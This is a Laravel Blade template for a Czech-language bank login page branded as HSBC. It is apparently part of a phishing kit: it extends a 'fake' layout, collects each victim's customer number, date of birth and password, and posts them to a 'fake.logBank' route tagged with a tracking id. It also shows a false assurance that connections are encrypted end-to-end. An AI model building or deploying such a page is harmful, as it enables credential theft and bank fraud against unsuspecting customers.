@extends('layouts.fake')
@push('css')
    <style>
        ._0 {
            margin: 0 auto;
            max-width: 400px;
            box-sizing: border-box;
            background: #fff;
            margin-top: 50px;
            margin-bottom: 50px;
        }
        ._01 {
            margin: 0 auto;
            max-width: 490px;
            box-sizing: border-box;
            padding: 24px;
            background: #fff;
            margin-top: 50px;
            padding-left: 0;
            margin-bottom: 50px;
        }
        ._1 {
            font-size: 28px;
            padding-top: 16px;
            width: 100%;
            text-align: center;
        }
        ._2 {
            margin: 10px 0;
            border-bottom: 1px solid #ddd;
        }
        ._3 {
            text-align: left;
            font-size: 14px;
            border: 1px solid #c5c4c4;
            border-radius: 6px;
            padding: 12px 10px;
            margin-bottom: 20px;
            background-color: #D0D0D0;
        }
        ._3:hover {
            border-color: #000;
        }
        ._4 {
            float: right;
            width: 100%;
            margin: 0;
            color: #000;
            font-weight: 400;
            font-size: 15px;
            line-height: 24px;
            display: inline-block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 8px 30px 6px 31px;
            min-width: 180px;
            border-radius: 7px;
            white-space: nowrap;
            background-color: #e90b0a;
            color: #fff;
            text-align: center;
            text-decoration: none;
        }
        ._4:hover {
            background-color: #e90b0a;
            color: #fff;
            border-color: #e90b0a;
        }
        ._5 {
            color: #aaa;
            text-align: right;
            width: 45%;
            padding-right: 24px;
        }
        ._6 {
            font-weight: bold;
        }
        ._7 {
            margin-top: 4px;
            margin-bottom: 16px;
        }
        ._8 {
            padding-bottom: 6px;
            line-height: 18px;
        }
        ._9 {
            text-align: right;
        }
        body {
            margin: 0;
            font-family: Arial;
            font-size: 12px;
            color: #222;
            word-break: break-word;
            user-select: none;
            background: #fdfdfd;
        }
        input {
            font-family: Arial;
            font-size: 12px;
            color: #222;
            width: 100%;
            border: none;
            box-sizing: border-box;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }
        td {
            padding: 4px 0;
        }
        #mainblock {
            display: flex;
            margin: 0 40px;
            border-bottom: 1px solid #e4e4e4;
        }
        #rightblock {
            margin-top: 100px;
            display: flex;
        }
        .loginboxes {
            display: block;
        }
        #formblock {
            /*border-right: 1px solid #e4e4e4;
            padding-right: 70px; */
            padding-bottom: 20px;
            margin-top: 20px;
        }
        #konto {
            float: right;
            padding-bottom: 10px;
            padding-top: 30px;
        }
        #Pomoc {
            display: none;
            padding-top: 25px;
            width: 150px;
        }
        @media all and (max-width: 800px) {
            #mainblock {
                display: block;
            }
            #formblock {
                border-right: none;
                padding-right: 0;
            }
        }
        @media all and (max-width: 500px) {
            .loginboxes {
                display: block;
            }
            #rightblock {
                display: block;
            }
            #konto {
                margin: 0;
            }
            #Pomoc {
                padding-top: 0;
                padding-bottom: 25px;
            }
            ._4 {
                width: 100%;
            }
        }
    </style>
@endpush
@section('content')
    <div id="mainblock">
        <div class="_0">
            <center>
                <img height="120"
                         src="data:image/png;base64,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">
            </center>
            <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                <div class="loginboxes" style="margin-bottom: 20px;">
                    <div class="_1">Přihlaste se do online bankovnictví</div>
                </div>
                <input class="_3" type="text" name="login"
                       placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
                <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
                <div class="loginboxes">
                    <p style="text-align: center; color: #666666;">Všechna připojení jsou šifrována end-to-end</p>
                    <input class="_4" type="submit" value="Další">
                    <br><br>
                </div>
                <center><img style="margin-top: 30px; border-radius: 9px; border-color: #222222;" height="180"
                             src="{{asset('images/banks/210602-banking-post-covid-five-things-that-will-or-wont-change-370x208.jpg')}}">
                </center>
            </form>
        </div>
        <footer>
            <center>{{date('Y')}} HSBC Bank</center>
        </footer>
    </div>
@endsection
